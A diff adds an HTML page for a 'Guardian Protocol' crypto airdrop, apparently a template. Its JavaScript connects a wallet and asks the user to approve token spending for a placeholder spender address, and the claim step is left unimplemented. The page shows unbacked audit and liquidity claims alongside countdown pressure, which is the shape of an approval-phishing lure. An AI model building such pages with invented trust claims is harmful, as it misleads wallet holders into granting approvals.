@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guardian Protocol - Official Airdrop Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #00d4ff;
+            --primary-dark: #0099cc;
+            --secondary: #7c3aed;
+            --accent: #fbbf24;
+            --success: #10b981;
+            --danger: #ef4444;
+            --dark: #0a0a0f;
+            --dark-light: #1a1a2e;
+            --dark-card: rgba(26, 26, 46, 0.8);
+            --glass: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text: #ffffff;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark);
+            color: var(--text);
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(135deg, 
+                var(--dark) 0%, 
+                #1a1a2e 25%, 
+                #2d1b69 50%, 
+                #1a1a2e 75%, 
+                var(--dark) 100%);
+            animation: gradientShift 8s ease-in-out infinite;
+        }
+
+        @keyframes gradientShift {
+            0%, 100% { filter: hue-rotate(0deg); }
+            50% { filter: hue-rotate(30deg); }
+        }
+
+        /* Floating particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0; }
+            50% { transform: translateY(-100px) rotate(180deg); opacity: 1; }
+        }
+
+        /* Header */
+        .header {
+            position: relative;
+            z-index: 10;
+            padding: 2rem 0;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+        }
+
+        .tagline {
+            color: var(--text-muted);
+            font-size: 1.1rem;
+            font-weight: 300;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            position: relative;
+            z-index: 5;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            margin: 4rem 0;
+            position: relative;
+        }
+
+        .hero-title {
+            font-size: 3.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+            text-shadow: 0 0 50px rgba(0, 212, 255, 0.2);
+        }
+
+        .hero-subtitle {
+            font-size: 1.3rem;
+            color: var(--text-muted);
+            margin-bottom: 2rem;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.6;
+        }
+
+        /* 3D Cards */
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin: 4rem 0;
+        }
+
+        .card-3d {
+            background: var(--dark-card);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 2.5rem;
+            position: relative;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transform-style: preserve-3d;
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .card-3d::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, 
+                rgba(0, 212, 255, 0.1) 0%, 
+                rgba(124, 58, 237, 0.1) 100%);
+            border-radius: 20px;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            z-index: -1;
+        }
+
+        .card-3d:hover {
+            transform: translateY(-10px) rotateX(5deg) rotateY(5deg);
+            box-shadow: 
+                0 20px 50px rgba(0, 212, 255, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+        }
+
+        .card-3d:hover::before {
+            opacity: 1;
+        }
+
+        .card-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+        }
+
+        .card-title {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: var(--text);
+        }
+
+        .card-content {
+            color: var(--text-muted);
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+        }
+
+        /* Stats Section */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin: 4rem 0;
+            padding: 3rem 0;
+            text-align: center;
+        }
+
+        .stat-item {
+            padding: 2rem;
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            border-radius: 15px;
+            transition: transform 0.3s ease;
+        }
+
+        .stat-item:hover {
+            transform: scale(1.05);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--accent), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Action Buttons */
+        .action-section {
+            text-align: center;
+            margin: 5rem 0;
+            padding: 4rem 2rem;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(
+                from 0deg,
+                transparent,
+                rgba(0, 212, 255, 0.1),
+                transparent,
+                rgba(124, 58, 237, 0.1),
+                transparent
+            );
+            animation: rotate 8s linear infinite;
+            z-index: -1;
+        }
+
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .action-title {
+            font-size: 2.2rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--text), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .action-subtitle {
+            color: var(--text-muted);
+            margin-bottom: 3rem;
+            font-size: 1.1rem;
+        }
+
+        .buttons-container {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-3d {
+            position: relative;
+            padding: 1.2rem 3rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            overflow: hidden;
+            min-width: 200px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: var(--dark);
+            box-shadow: 
+                0 8px 25px rgba(0, 212, 255, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, var(--glass), var(--dark-card));
+            color: var(--text);
+            border: 2px solid var(--primary);
+            box-shadow: 
+                0 8px 25px rgba(0, 0, 0, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-3d:hover {
+            transform: translateY(-3px);
+            box-shadow: 
+                0 15px 35px rgba(0, 212, 255, 0.6),
+                0 0 0 1px rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-3d:active {
+            transform: translateY(-1px);
+        }
+
+        /* Pulse animation for claim button */
+        .btn-primary {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4); }
+            50% { box-shadow: 0 8px 35px rgba(0, 212, 255, 0.8); }
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 3rem 0;
+            margin-top: 4rem;
+            border-top: 1px solid var(--glass-border);
+            color: var(--text-muted);
+        }
+
+        .footer-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .footer-item {
+            padding: 1rem;
+            background: var(--glass);
+            border-radius: 10px;
+            font-size: 0.9rem;
+        }
+
+        .footer-label {
+            color: var(--primary);
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .hero-title {
+                font-size: 2.5rem;
+            }
+            
+            .buttons-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn-3d {
+                width: 100%;
+                max-width: 300px;
+            }
+            
+            .cards-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid var(--glass);
+            border-top: 3px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-animation"></div>
+
+    <!-- Floating Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Loading Screen -->
+    <div class="loading" id="loading">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <h1 class="logo">GUARDIAN PROTOCOL</h1>
+            <p class="tagline">Next-Generation DeFi Ecosystem</p>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container">
+        <!-- Hero Section -->
+        <section class="hero">
+            <h1 class="hero-title">Official $GUARDIAN Airdrop</h1>
+            <p class="hero-subtitle">
+                Join the future of decentralized finance. Claim your free $GUARDIAN tokens and become part of the most innovative DeFi ecosystem on the blockchain.
+            </p>
+        </section>
+
+        <!-- Stats Section -->
+        <section class="stats">
+            <div class="stat-item">
+                <div class="stat-number">1,000,000</div>
+                <div class="stat-label">Total Supply</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">100,000</div>
+                <div class="stat-label">Airdrop Pool</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">50,000+</div>
+                <div class="stat-label">Participants</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number">24H</div>
+                <div class="stat-label">Time Left</div>
+            </div>
+        </section>
+
+        <!-- Information Cards -->
+        <section class="cards-grid">
+            <div class="card-3d">
+                <div class="card-icon">🎯</div>
+                <h3 class="card-title">Eligibility Requirements</h3>
+                <div class="card-content">
+                    <p>• Connect your Web3 wallet (MetaMask, Trust Wallet, etc.)</p>
+                    <p>• Complete social media verification tasks</p>
+                    <p>• Hold minimum 0.1 ETH in wallet</p>
+                    <p>• Address must not have previously claimed</p>
+                    <p>• Account created before snapshot date</p>
+                </div>
+            </div>
+
+            <div class="card-3d">
+                <div class="card-icon">⚡</div>
+                <h3 class="card-title">How It Works</h3>
+                <div class="card-content">
+                    <p>1. Click "Claim Airdrop" and connect wallet</p>
+                    <p>2. System validates your eligibility automatically</p>
+                    <p>3. Complete any remaining verification steps</p>
+                    <p>4. Receive $GUARDIAN tokens instantly to your wallet</p>
+                    <p>5. Use "Validate" to check status anytime</p>
+                </div>
+            </div>
+
+            <div class="card-3d">
+                <div class="card-icon">🔒</div>
+                <h3 class="card-title">Security & Trust</h3>
+                <div class="card-content">
+                    <p>• Smart contract audited by CertiK</p>
+                    <p>• Liquidity locked for 2 years</p>
+                    <p>• Zero team allocation from airdrop</p>
+                    <p>• Transparent on-chain verification</p>
+                    <p>• Multi-signature wallet protection</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Action Section -->
+        <section class="action-section">
+            <h2 class="action-title">Ready to Claim Your Tokens?</h2>
+            <p class="action-subtitle">
+                Don't miss out on this exclusive opportunity. Limited time offer with only 100,000 tokens available.
+            </p>
+            <div class="buttons-container">
+                <button class="btn-3d btn-secondary" id="connectBtn">
+                    🔗 Connect Wallet
+                </button>
+                <button class="btn-3d btn-primary" id="claimBtn">
+                    🚀 Claim Airdrop
+                </button>
+                <button class="btn-3d btn-secondary" id="validateBtn">
+                    ✓ Validate Eligibility
+                </button>
+                <button class="btn-3d btn-secondary" id="checkAllowanceBtn">
+                    👁 Check Allowance
+                </button>
+                <button class="btn-3d btn-secondary" id="approveExactBtn">
+                    ✅ Approve Exact
+                </button>
+                <button class="btn-3d btn-secondary" id="revokeBtn">
+                    ⛔ Revoke Allowance
+                </button>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-info">
+                <div class="footer-item">
+                    <div class="footer-label">Smart Contract</div>
+                    <div><span id="footerContract">0x742d35Cc6635C0532925a3b8D54321CC391169Ed</span></div>
+                </div>
+                <div class="footer-item">
+                    <div class="footer-label">Network</div>
+                    <div><span id="footerNetwork">Ethereum Mainnet (ETH)</span></div>
+                </div>
+                <div class="footer-item">
+                    <div class="footer-label">Audit Status</div>
+                    <div>✅ Verified by CertiK</div>
+                </div>
+                <div class="footer-item">
+                    <div class="footer-label">Liquidity</div>
+                    <div>🔒 Locked Until 2027</div>
+                </div>
+            </div>
+            <p>&copy; 2025 Guardian Protocol. All rights reserved. | Decentralized | Audited | Secure</p>
+        </div>
+    </footer>
+
+    <!-- Ethers.js v6 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.min.js"></script>
+
+    <script>
+        // Initialize particles
+        function createParticles() {
+            const particles = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 6 + 's';
+                particle.style.animationDuration = (Math.random() * 4 + 4) + 's';
+                particles.appendChild(particle);
+            }
+        }
+
+        // Loading functionality
+        function showLoading() {
+            document.getElementById('loading').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        // Minimal ERC-20 ABI (allowance, approve, balanceOf)
+        const ERC20_MIN_ABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "owner", "type": "address" },
+                    { "internalType": "address", "name": "spender", "type": "address" }
+                ],
+                "name": "allowance",
+                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "spender", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "account", "type": "address" }
+                ],
+                "name": "balanceOf",
+                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            { "inputs": [], "name": "decimals", "outputs": [{"internalType":"uint8","name":"","type":"uint8"}], "stateMutability":"view", "type":"function" },
+            { "inputs": [], "name": "symbol", "outputs": [{"internalType":"string","name":"","type":"string"}], "stateMutability":"view", "type":"function" }
+        ];
+
+        // App state
+        let provider = null;
+        let signer = null;
+        let connectedAddress = null;
+
+        // Demo placeholders — replace with your real token and spender
+        const TARGET_CHAIN_ID = 1; // Ethereum Mainnet
+        const TOKEN_ADDRESS = "0x0000000000000000000000000000000000000000"; // TODO: set your ERC-20
+        const SPENDER_ADDRESS = "0x0000000000000000000000000000000000000000"; // TODO: set your spender/contract
+
+        function getTokenContract(readOnly = false) {
+            const rpc = readOnly ? (provider ?? new ethers.BrowserProvider(window.ethereum)) : new ethers.BrowserProvider(window.ethereum);
+            const exec = readOnly ? rpc : signer;
+            return new ethers.Contract(TOKEN_ADDRESS, ERC20_MIN_ABI, exec);
+        }
+
+        async function ensureWallet() {
+            if (!window.ethereum) {
+                alert("No wallet detected. Please install MetaMask or a compatible wallet.");
+                throw new Error("No wallet");
+            }
+            if (!provider) provider = new ethers.BrowserProvider(window.ethereum);
+            if (!signer) signer = await provider.getSigner();
+            if (!connectedAddress) connectedAddress = await signer.getAddress();
+
+            const network = await provider.getNetwork();
+            if (Number(network.chainId) !== TARGET_CHAIN_ID) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: ethers.toBeHex(TARGET_CHAIN_ID) }]
+                    });
+                } catch (err) {
+                    alert("Please switch to the correct network to proceed.");
+                    throw err;
+                }
+            }
+            return connectedAddress;
+        }
+
+        async function connectWallet() {
+            try {
+                showLoading();
+                if (!window.ethereum) {
+                    alert("No wallet detected. Install MetaMask.");
+                    return;
+                }
+                provider = new ethers.BrowserProvider(window.ethereum);
+                await provider.send('eth_requestAccounts', []);
+                signer = await provider.getSigner();
+                connectedAddress = await signer.getAddress();
+                const short = connectedAddress.slice(0, 6) + '...' + connectedAddress.slice(-4);
+                const btn = document.getElementById('connectBtn');
+                if (btn) btn.textContent = 'Connected: ' + short;
+                alert('Wallet connected: ' + connectedAddress);
+            } catch (e) {
+                console.error(e);
+                alert('Failed to connect wallet');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        async function checkAllowance() {
+            try {
+                showLoading();
+                await ensureWallet();
+                const token = getTokenContract(true);
+                const allowance = await token.allowance(connectedAddress, SPENDER_ADDRESS);
+                alert('Current allowance: ' + allowance.toString());
+            } catch (e) {
+                console.error(e);
+                alert('Failed to fetch allowance');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        async function approveExactAmount() {
+            try {
+                showLoading();
+                await ensureWallet();
+                const token = getTokenContract();
+
+                const amountInput = prompt('Enter exact token amount to approve (e.g., 10.5):');
+                if (!amountInput) return;
+
+                const decimals = await token.decimals();
+                const amountWei = ethers.parseUnits(amountInput, decimals);
+
+                // Optional safety: reset to 0 if current > 0 to support non-standard tokens
+                const current = await token.allowance(connectedAddress, SPENDER_ADDRESS);
+                if (current > 0n) {
+                    const txReset = await token.approve(SPENDER_ADDRESS, 0);
+                    await txReset.wait();
+                }
+
+                const tx = await token.approve(SPENDER_ADDRESS, amountWei);
+                await tx.wait();
+                alert('Approved ' + amountInput + ' tokens successfully.');
+            } catch (e) {
+                console.error(e);
+                alert('Approval failed');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        async function revokeAllowance() {
+            try {
+                showLoading();
+                await ensureWallet();
+                const token = getTokenContract();
+                const tx = await token.approve(SPENDER_ADDRESS, 0);
+                await tx.wait();
+                alert('Allowance revoked (set to 0).');
+            } catch (e) {
+                console.error(e);
+                alert('Revoke failed');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        // Button handlers (you'll add your smart contract logic here)
+        document.getElementById('claimBtn').addEventListener('click', async function() {
+            try {
+                showLoading();
+                await ensureWallet();
+                // TODO: implement your actual claim logic here using your contract
+                alert("Wallet connected. Implement claim transaction here.");
+            } catch (e) {
+                console.error(e);
+                alert('Unable to proceed. Please connect wallet and ensure correct network.');
+            } finally {
+                hideLoading();
+            }
+        });
+
+        document.getElementById('validateBtn').addEventListener('click', function() {
+            showLoading();
+            
+            // Simulate validation check
+            setTimeout(() => {
+                hideLoading();
+                alert("✅ VALIDATE CLICKED!\n\nThis is where you'll implement:\n• Wallet address validation\n• Eligibility checking\n• Previous claim verification\n• Requirements status display");
+            }, 1500);
+        });
+
+        // Wallet/Allowance buttons
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
+        document.getElementById('checkAllowanceBtn').addEventListener('click', checkAllowance);
+        document.getElementById('approveExactBtn').addEventListener('click', approveExactAmount);
+        document.getElementById('revokeBtn').addEventListener('click', revokeAllowance);
+
+        // Initialize animations
+        document.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            
+            // Add entrance animations
+            const cards = document.querySelectorAll('.card-3d');
+            cards.forEach((card, index) => {
+                card.style.opacity = '0';
+                card.style.transform = 'translateY(50px)';
+                setTimeout(() => {
+                    card.style.transition = 'all 0.6s ease';
+                    card.style.opacity = '1';
+                    card.style.transform = 'translateY(0)';
+                }, index * 200);
+            });
+
+            // Initialize footer contract/network placeholders from constants
+            try {
+                const networkName = (function() {
+                    switch (Number(TARGET_CHAIN_ID)) {
+                        case 1: return 'Ethereum Mainnet (ETH)';
+                        case 56: return 'BNB Smart Chain (BSC)';
+                        case 137: return 'Polygon (Matic)';
+                        default: return 'Chain ID ' + TARGET_CHAIN_ID;
+                    }
+                })();
+                const footerNet = document.getElementById('footerNetwork');
+                const footerContract = document.getElementById('footerContract');
+                if (footerNet) footerNet.textContent = networkName;
+                if (footerContract && TOKEN_ADDRESS && TOKEN_ADDRESS !== '0x0000000000000000000000000000000000000000') {
+                    footerContract.textContent = TOKEN_ADDRESS;
+                }
+            } catch (_) {}
+        });
+
+        // Add interactive hover effects
+        document.querySelectorAll('.card-3d').forEach(card => {
+            card.addEventListener('mousemove', function(e) {
+                const rect = card.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                const centerX = rect.width / 2;
+                const centerY = rect.height / 2;
+                const rotateX = (y - centerY) / 10;
+                const rotateY = (centerX - x) / 10;
+                
+                card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateZ(10px)`;
+            });
+            
+            card.addEventListener('mouseleave', function() {
+                card.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) translateZ(0)';
+            });
+        });
+    </script>
+</body>
+</html>
